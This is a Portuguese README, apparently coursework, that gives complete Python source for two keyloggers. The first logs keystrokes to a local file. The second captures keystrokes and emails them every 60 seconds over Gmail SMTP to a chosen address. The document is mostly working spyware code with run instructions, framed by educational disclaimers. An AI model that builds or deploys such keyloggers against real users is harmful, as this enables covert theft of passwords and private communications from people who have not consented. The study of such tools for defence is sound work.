# evidencias-curso-santander-keylogger

# **Keylogger em Python (Uso Educacional)**

Este projeto contém um script simples em Python, usando a biblioteca `pynput`, para registrar teclas pressionadas.  
O objetivo é **educacional**, demonstrando como funciona a captura de eventos do teclado.

**Atenção:** O uso sem autorização é ilegal. Utilize apenas em ambientes de teste ou estudo.

---

## Como funciona

- Captura teclas normais e grava diretamente no arquivo `log.txt`;
- Trata teclas especiais (Enter, Espaço, Backspace, Tab, Caps Lock etc.);
- Ignora teclas como Shift, Ctrl, Alt e Windows/Cmd;
- O script permanece ativo até ser encerrado manualmente.

---

## Código

```python
from pynput import keyboard

ignorar = {keyboard.Key.shift,
           keyboard.Key.shift_r,
           keyboard.Key.ctrl_l,
           keyboard.Key.ctrl_r,
           keyboard.Key.alt_l,
           keyboard.Key.alt_r,
           keyboard.Key.cmd
           }

def on_press(key):
        try:
            with open("log.txt", "a", encoding="utf-8") as fernet:
                fernet.write(key.char)

        except AttributeError:
            with open("log.txt", "a", encoding="utf-8") as fernet:
                if key == keyboard.Key.space:
                    fernet.write(" ")
                elif key == keyboard.Key.enter:
                    fernet.write("\n")
                elif key == keyboard.Key.backspace:
                    fernet.write(" ")
                elif key == keyboard.Key.tab:
                    fernet.write("[TAB]")
                elif key == keyboard.Key.esc:
                    fernet.write("[ESC]")
                elif key == keyboard.Key.delete:
                    fernet.write(" ")
                elif key == keyboard.Key.caps_lock:
                    fernet.write("[CAPSLOCK]")
                elif key not in ignorar:
                    pass
                else:
                    fernet.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## Execução

1. Instale a dependência:

```
pip install pynput
```

2. Execute o script:

```
python keylogger.py
```

O arquivo `log.txt` será criado automaticamente.

---

![Print script run](/images/codigo_keylogger_run.png) <br/>

![Print log de captura](/images/log_capturado.png) <br/>

---

# **Keylogger com Envio Automático por E-mail (Uso Educacional)**

Este projeto demonstra um keylogger em Python que registra teclas pressionadas e envia periodicamente os dados capturados por e-mail.  
O objetivo é **educacional**, apresentando conceitos de captura de eventos, automação e envio de e-mail via SMTP.

**Atenção:** O uso sem autorização é ilegal. Utilize apenas em ambientes de teste ou pesquisa.  
**Jamais deixe credenciais expostas no código.**

---

## Funcionalidade

- Captura teclas pressionadas usando `pynput`;
- Armazena tudo em uma variável de log;
- A cada 60 segundos, envia o conteúdo capturado para um e-mail configurado no script;
- Após o envio, o log é limpo e o processo continua automaticamente.

---

## Código

```python
from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

#configuração de e-mail
EMAIL_ORIGEM = "seu_email@gmail.com"
SENHA_EMAIL = "SUA_SENHA_AQUI"
EMAIL_DESTINO = "destinatario@gmail.com"

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char 
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
```

---

## Execução

1. Instale as dependências:
```
pip install pynput
```

2. Ative “Senha de App” no Gmail (não use sua senha real).  
3. Edite o script com suas credenciais.
4. Execute o arquivo:

```
python script.py
```

A cada 60 segundos, você receberá um e-mail com o texto capturado.

---

![Print log de capturado e enviado por e-mail](/images/log_capturado_enviado_email.png) <br/>

## Observação

Use **somente** em ambientes autorizados e para estudo.


